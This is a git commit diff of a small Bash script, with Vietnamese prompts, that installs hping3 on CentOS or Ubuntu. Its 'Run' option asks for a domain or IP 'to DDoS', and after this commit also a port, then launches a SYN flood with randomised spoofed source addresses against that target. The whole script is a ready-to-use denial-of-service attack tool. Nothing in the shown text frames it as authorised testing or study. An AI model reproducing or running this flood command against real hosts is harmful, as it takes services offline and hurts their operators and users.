2d99d2305fee86c248c2feabea5960d8642c5757
dominhtan <85058029+dominhtan@users.noreply.github.com>
2021-06-24 06:10:37 +0700

    Update hping3.sh

--- hping3.sh
+++ hping3.sh
@@ -1,15 +1,11 @@
 #!/bin/bash
 clear
-PS3="Chọn hệ điều hành Linux để cài hping3 :"
-opt=("Centos" "Ubuntu" "Exit")
-select menu in "${opt[@]}"
-do
-        case $menu in
-        "Centos")
-        if (`cat /etc/os-release | grep -q 'CentOS'`); then
-                echo Hệ điều hành của bạn là : CentOS
-                cat /etc/os-release | head -5
-                        opt1=("Setup" "Run" "Exit")
+PS3="Vui lòng chọn chức năng :"
+if (`cat /etc/os-release | grep -q 'CentOS'`); then
+        echo Hệ điều hành của bạn là : CentOS
+        cat /etc/os-release | head -5
+        echo "................................"
+        opt1=("Setup" "Run" "Exit")
                 select menu1 in "${opt1[@]}"
                 do
                         case $menu1 in
@@ -18,25 +14,22 @@ do
                         sudo yum install hping3 -y
                 ;;
                 "Run")
-                        printf " Điền IP cần DDos : "
+                        printf " Tên miền hoặc IP cần DDos : "
                 read n
-                hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
+                        printf " Port :"
+                read m
+                        hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                 ;;
                 "Exit")
                         break
                 ;;
                 esac
                 done
-        else
-                echo Hệ điều hành của bạn không phải CentOS $REPLY
-        exit
-fi
-        ;;
-        "Ubuntu")
-        if (`cat /etc/os-release | grep -q 'Ubuntu'`); then
-                echo Hệ điều hành của bạn là : Ubuntu
-                cat /etc/os-release | head -2
-                       opt2=("Setup" "Run" "Exit")
+elif (`cat /etc/os-release | grep -q 'Ubuntu'`); then
+         echo Hệ điều hành của bạn là : Ubuntu
+         cat /etc/os-release | head -2
+         echo "..............................."
+         opt2=("Setup" "Run" "Exit")
                 select menu2 in "${opt2[@]}"
                 do
                         case $menu2 in
@@ -45,23 +38,17 @@ fi
                         sudo apt-get install hping3 -y
                 ;;
                 "Run")
-                        printf " Điền IP cần DDos : "
+                        printf " Điền tên miền hoặc IP cần DDos : "
                 read n
-                        hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
+                        printf " Port : "
+                read m
+                        hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                 ;;
                 "Exit")
                         break
                 ;;
                 esac
                 done
-        else
-                echo Hệ điều hành của bạn không phải Ubuntu $REPLY
-        exit
+else
+        echo Không xác định được hệ điều hành $REPLY
 fi
-      ;;
-        "Exit")
-        echo Thoát thành công
-        exit
-        ;;
-esac
-done
